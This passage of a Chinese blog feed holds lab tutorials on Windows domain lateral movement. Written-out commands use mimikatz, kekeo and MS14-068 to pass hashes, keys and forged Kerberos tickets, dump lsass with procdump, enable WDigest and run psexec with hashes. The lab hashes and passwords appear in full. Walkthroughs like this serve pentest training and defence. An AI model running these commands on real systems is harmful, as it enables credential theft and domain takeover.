        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/%E4%BC%A0%E9%80%92-16564664836142.png" alt="传递"></p><h2 id="0x01-Kerberos-协议"><a href="#0x01-Kerberos-协议" class="headerlink" title="0x01 Kerberos 协议"></a>0x01 Kerberos 协议</h2><p>###0x00 图解</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629091847090.png" alt="image-20220629091847090"></p><h3 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><ul><li><p>客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Granting Ticket)</p></li><li><p>将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读取 kerberos 中 TGT 数据</p></li><li><p>然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服务）票证，并且对 TGT 进行检测</p></li><li><p>检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将加密后的结果返回给客户机</p></li></ul><p>###0x02 利用PTH&amp;PTT&amp;PTK进行渗透测试</p><blockquote><p>PTH(pass the hash) #利用 lm 或 ntlm 的值进行的渗透测试</p><p>PTT(pass the ticket) #利用的票据凭证 TGT 进行的渗透测试</p><p>PTK(pass the key) #利用的 ekeys aes256 进行的渗透测试</p></blockquote><ul><li><p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p></li><li><p>PTK：打了补丁才能用户都可以连接，采用 AES256 连接</p></li><li><p>PTT 攻击不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击。</p></li></ul><blockquote><p>PTT常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。</p><p>MS14-068 基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)</p><p>MS14-068 造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是KB3011780。</p></blockquote><h2 id="0x02-PTH-NTML传递-Mimikatz"><a href="#0x02-PTH-NTML传递-Mimikatz" class="headerlink" title="0x02 PTH-NTML传递-Mimikatz"></a>0x02 PTH-NTML传递-Mimikatz</h2><h3 id="0x00-未打补丁下的工作组及域连接"><a href="#0x00-未打补丁下的工作组及域连接" class="headerlink" title="0x00 未打补丁下的工作组及域连接"></a>0x00 未打补丁下的工作组及域连接</h3><p>先使用mimikatz获取凭证信息NTML：<br><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629093835678.png" alt="image-20220629093835678"></p><p>接着获取ekeys和aes1556：<br>执行：<code>mimikatz # sekurlsa::ekeys</code></p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629094628707.png" alt="image-20220629094628707"></p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629094500855.png" alt="image-20220629094500855"></p><blockquote><p>获取到aes256：5e90d14b7bb44da0531c6d8e081c20dcecbc9969304ae0d5448a364163b5142f</p><p>（PTK传递aes256）</p></blockquote><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>先尝试访问DC主机c盘：</p><pre class="line-numbers language-none"><code class="language-none">dir \\192.168.3.21\c$ 或者dir \\DC.test.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629102604255.png" alt="image-20220629102604255"></p><p>可以看到找不到路径，是因为这时候使用本地用户登录，没有凭据。</p><p>（假设已经拿到域控的hash）</p><p>使用mimikatz执行命令：</p><pre class="line-numbers language-none"><code class="language-none">mimikatz # privilege::debug<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629103448781.png" alt="image-20220629103448781"></p><p>出现报错；是因为本地用户权限不够，这也是为什么要提权的原因。</p><p>使用管理员权限运行：</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:test &#x2F;ntlm:9075168608b7aba2428c8387bfeb9aee #连接域内主机<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629101603978.png" alt="image-20220629101603978"></p><p>会反弹一个cmd命令窗。</p><p>执行：（必须要在弹出的cmd中执行，因为是管理员权限）</p><pre class="line-numbers language-none"><code class="language-none">dir \\192.168.3.21\c$ 或者dir \\DC.test.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629101753943.png" alt="image-20220629101753943"></p><p>可查看DC主机的c盘所有文件。</p><blockquote><p>这时候可以访问DC主机c盘是由于使用mimikatz传递了凭据，导致本地用户有了权限去访问DC主机。</p></blockquote><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>使用mimikatz获取到webserver主机的NTML后连接其工作组主机：</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:9075168608b7aba2428c8387bfeb9aee #连接工作组内主机<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里NTML值相同是因为DC主机和webserver主机密码相同。</p></blockquote><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629104820519.png" alt="image-20220629104820519"></p><p>反弹cmd，这时候就能连接工作组内的主机（本地用户），由于环境原因，没有添加其他PC加入工作组；若添加用户后，则可以访问其PC主机。</p><p>若命令中为<code>domain:test(域)</code>则是连接的域内用户。</p><blockquote><p>总结：</p><ul><li><p>通常渗透过程中，不能只单单渗透域内用户，也可以渗透本地用户；</p></li><li><p>如果禁用了 NTLM 认证，PsExec 无法利用获得的NTLM hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。</p></li><li><p>对于 8.1&#x2F;2012R2，安装补丁 KB2871997 的 Win7&#x2F;2008R2&#x2F;8&#x2F;2012 等，可以使用 AES keys代替 NT hash 来实现 PTK 攻击；</p></li><li><p>KB2871997 补丁后的影响：</p><ol><li>PTH：没打补丁用户都可以连接，打了补丁只能 administrator 连接</li><li>PTK：打了补丁才能用户都可以连接，采用 aes256 连接</li></ol></li><li><p>参考文章：</p></li></ul><p>​        <a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></p></blockquote><h2 id="0x03-PTK-AES256传递-mimikatz"><a href="#0x03-PTK-AES256传递-mimikatz" class="headerlink" title="0x03 PTK-AES256传递-mimikatz"></a>0x03 PTK-AES256传递-mimikatz</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p><strong>注意：PTK攻击必须打补丁才能连接上去，不打补丁连接不上去。</strong></p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>mimikatz获取DC主机aes：</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::ekeys #获取 aes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629111631761.png" alt="image-20220629111631761"></p><p>连接DC主机：</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:test &#x2F;aes256:266bb6886f375743d72ae5369e58fc1939f4ec7016e8f259f0c16b28ea6d9bb6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629112734677.png" alt="image-20220629112734677"></p><p>反弹cmd命令窗。</p><blockquote><p>PTK攻击必须打补丁，不然不能使用aes连接。</p></blockquote><p>##0x04  PTT 传递-MS14-068利用</p><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p>能实现普通用户直接获取域控 system 权限。</p><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p><strong>1、首先查看当前sid（域用户）</strong></p><pre class="line-numbers language-none"><code class="language-none">whoami&#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629174344320.png" alt="image-20220629174344320"></p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629174527577.png" alt="image-20220629174527577"></p><p><strong>2、执行MS14-068：</strong></p><blockquote><p>ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码</p></blockquote><pre class="line-numbers language-none"><code class="language-none">MS14-068.exe -u xiaobai@test.com -s S-1-5-21-4262547415-2925858076-1802417703-1111 -d 192.168.3.21 - p Admin123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629175309522.png" alt="image-20220629175309522"></p><p>这里需要密码是当前域用户的密码：Admin123</p><p>之后在执行MS14-068的文件夹中查看生成了<code>TGT_xiaobai@test.com.ccache</code>票据。</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629175951736.png" alt="image-20220629175951736"></p><p><strong>3、执行<code>klist命令</code>查看当前是否存在连接：</strong></p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629180302728.png" alt="image-20220629180302728"></p><p>存在5个票据。</p><p><strong>4、清空当前机器中所有凭证（如果有域成员凭证会影响凭证伪造）</strong></p><pre class="line-numbers language-none"><code class="language-none">执行:klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629180612217.png" alt="image-20220629180612217"></p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629180635479.png" alt="image-20220629180635479"></p><p><strong>5、使用mimikatz将刚才生成的票据注入内存</strong></p><pre class="line-numbers language-none"><code class="language-none">mimikatz # kerberos::ptc TGT_xiaobai@test.com.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629181339141.png" alt="image-20220629181339141"></p><p>注入票据成功。</p><p><strong>6、尝试连接目标主机：</strong><br><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629181431518.png" alt="image-20220629181431518"></p><p>拒绝访问是由于不支持ip地址连接；</p><p>使用域名连接：</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629181453989.png" alt="image-20220629181453989"></p><p><strong>7、mimikatz相关命令</strong>：</p><blockquote><p>mimikatz # kerberos::purge &#x2F;&#x2F;清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p><p>mimikatz # kerberos::list &#x2F;&#x2F;查看当前机器凭证</p><p>mimikatz # kerberos::ptc 票据文件 &#x2F;&#x2F;将票据注入到内存中</p></blockquote><p>##0x05 PTT-传递kekeo票据注入</p><p>###0x00</p><p>下载地址：<br><a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><h3 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h3><p>先使用mimikatz获取NTLM：</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629191707398.png" alt="image-20220629191707398"></p><p>生成票据：</p><pre class="line-numbers language-none"><code class="language-none">kekeo &quot;tgt::ask &#x2F;user:xiaobai &#x2F;domain:test.com &#x2F;ntlm:e45a314c664d40a227f9540121d1a29d&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：</p><p>这里的NTLM使用的是域用户xiaobai的NTLM</p></blockquote><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629191812917.png" alt="image-20220629191812917"></p><p>在当前文件夹生成了票据：<br><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629191952327.png" alt="image-20220629191952327"></p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>将生成票据导入：</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt TGT_xiaobai@TEST.COM_krbtgt~test.com@TEST.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629192727362.png" alt="image-20220629192727362"></p><blockquote><p>注意：<br>这里生成的票据需要和kekeo在同一文件夹，不然会导入失败。</p></blockquote><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>清除凭证之后查看凭据：<br><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629192921144.png" alt="image-20220629192921144"></p><p>之后就可以连接目标主机。</p><h2 id="0x06-PTT传递-利用本地票据"><a href="#0x06-PTT传递-利用本地票据" class="headerlink" title="0x06 PTT传递-利用本地票据"></a>0x06 PTT传递-利用本地票据</h2><h3 id="0x00-3"><a href="#0x00-3" class="headerlink" title="0x00"></a>0x00</h3><p>这种方式需要管理员权限，首先使用mimikatz收集号本地的票据（之前与域控建立连接的票据收集起来），之后再导入内存。</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629194427407.png" alt="image-20220629194427407"></p><h3 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h3><p>mimikatz搜集本地票据：</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629194617732.png" alt="image-20220629194617732"></p><p>当前文件夹查看收集到的凭据：</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629194638231.png" alt="image-20220629194638231"></p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>导入凭据：</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt xxxxxxxxxx.xxxx.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在搜集到的凭据里筛选凭据进行凭据注入。</p><p>随便找一个凭据进行注入：</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629195449746.png" alt="image-20220629195449746"></p><p>最后可以使用klist查看是否注入票据。</p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>凭据只存活10个小时，超过10个小时失效：</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/image-20220629194935338.png" alt="image-20220629194935338"></p><h2 id="0x07-国产-Ladon-内网杀器"><a href="#0x07-国产-Ladon-内网杀器" class="headerlink" title="0x07 国产 Ladon 内网杀器"></a>0x07 国产 Ladon 内网杀器</h2><p>###0x00</p><p>下载地址：</p><p><a href="https://github.com/k8gege/Ladon/releases">k8gege&#x2F;Ladon: 大型内网渗透扫描器</a></p><p>解压密码：k8gege.org</p><h3 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h3><p>支持CMD，也支持GUI。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全-域横向渗透【二】</title>
      <link href="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/"/>
      <url>/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-相关知识点"><a href="#0x00-相关知识点" class="headerlink" title="0x00 相关知识点"></a>0x00 相关知识点</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>1、Windows2012以上版本默认关闭<code>wdigest</code>，攻击者无法从内存中获取明文密码（mimikatz），只能获取相关的hash值；</p><p>2、Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</p><blockquote><p>解决方法：</p><p>1、利用哈希hash传递（pth，ptk等）进行移动；</p><p>2、利用其它服务协议（SMB，WMI等）进行哈希移动；</p><p>3、利用注册表操作开启Wdigest，Auth值进行获取；（提权）</p><p>4、利用工具或第三方平台（Hashcat）进行破解获取。</p></blockquote><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p><blockquote><p>开启Wdigest：</p><p><code>HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p></blockquote><h2 id="0x01-Procdump-Mimikatz-配合获取密码"><a href="#0x01-Procdump-Mimikatz-配合获取密码" class="headerlink" title="0x01 Procdump+Mimikatz 配合获取密码"></a>0x01 Procdump+Mimikatz 配合获取密码</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>Mimilatz上传到目标服务器可能会被杀掉或者被拦截，配合Procdump进行密码获取，Procdump使微软自带工具，不会被检测。</p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>procdump执行以下命令生成一个存储hash值的dmp文件：</p><pre class="line-numbers language-none"><code class="language-none">procdump -accepteula -ma lsass.exe lsass.dmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628104447679.png" alt="image-20220628104447679"></p><p>本地mimikatz 上执行：</p><pre class="line-numbers language-none"><code class="language-none">privilege::debug  #进行提权<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行以下命令，使mimikatz载入lsass.dmp文件中的hash值进行获取密码。</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628105109591.png" alt="image-20220628105109591"></p><p>获取到webserver密码：</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628105242893.png" alt="image-20220628105242893"></p><h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>一般是将procdump.exe上传至目标服务器生成一个dmp文件，再将dmp文件复制到本地使用mimikatz进行获取密码；因为mimikatz上传至服务器可能会被拦截或者杀毒软件杀掉，所以在本地进行mimikatz进行密码获取。</p><h2 id="0x02-Hashcat破解获取-Windows-NTML-Hash"><a href="#0x02-Hashcat破解获取-Windows-NTML-Hash" class="headerlink" title="0x02 Hashcat破解获取 Windows-NTML-Hash"></a>0x02 Hashcat破解获取 Windows-NTML-Hash</h2><p>HashCat使用参考文章：</p><p><a href="https://www.freebuf.com/sectool/164507.html">https://www.freebuf.com/sectool/164507.html</a></p><p><a href="https://blog.csdn.net/SHIGUANGTUJING/article/details/90074614">https://blog.csdn.net/SHIGUANGTUJING/article/details/90074614</a></p><p>字典下载：<br><a href="https://wiki.skullsecurity.org/Passwords">https://wiki.skullsecurity.org/Passwords</a></p><h2 id="0x03-SMB-服务利用-psexec-smbexec-官方自带"><a href="#0x03-SMB-服务利用-psexec-smbexec-官方自带" class="headerlink" title="0x03 SMB 服务利用-psexec,smbexec(官方自带)"></a>0x03 SMB 服务利用-psexec,smbexec(官方自带)</h2><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。</p><p>pstools下载地址：<br><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><h3 id="0x01-psexec-第一种方法"><a href="#0x01-psexec-第一种方法" class="headerlink" title="0x01 psexec 第一种方法"></a>0x01 psexec 第一种方法</h3><p><strong>（先将PSTools上传至目标服务器）</strong></p><p><strong>先有 ipc 链接，psexec 需要明文或 hash 传递</strong></p><p>ipc连接：</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.3.32\ipc$ &quot;Hacker123&quot; &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628111932509.png" alt="image-20220628111932509"></p><p>先有 ipc 连接之后，参数 -s 以 system 权限运行</p><pre class="line-numbers language-none"><code class="language-none">psexec \\192.168.3.32 -s cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628112158307.png" alt="image-20220628112158307"></p><p>获取到的使system权限；</p><p>查看ip，拿到目标Iip的shell：</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628112240633.png" alt="image-20220628112240633"></p><h3 id="0x02-psexec第二种方法"><a href="#0x02-psexec第二种方法" class="headerlink" title="0x02 psexec第二种方法"></a>0x02 psexec第二种方法</h3><p><strong>不用建立 IPC 直接提供明文账户密码</strong></p><p>执行以下命令：（不需要建立IPC连接）</p><pre class="line-numbers language-none"><code class="language-none">psexec \\192.168.3.21 -u administrator -p Hacker123 -s cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628113114749.png" alt="image-20220628113114749"></p><p><strong>这种方式是建立在明文密码情况下，没有明文密码就需要利用Hash值。</strong></p><p>###0x03 impacket 工具包使用hash传递：</p><pre class="line-numbers language-none"><code class="language-none">psexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32 #官方 Pstools 无法采用 hash连接<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628115558922.png" alt="image-20220628115558922"></p><p>使用 impacket 工具包：（非官方，容易被杀，需要做免杀）</p><pre class="line-numbers language-none"><code class="language-none">psexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628115813191.png" alt="image-20220628115813191"></p><p>查看ip：<br><img 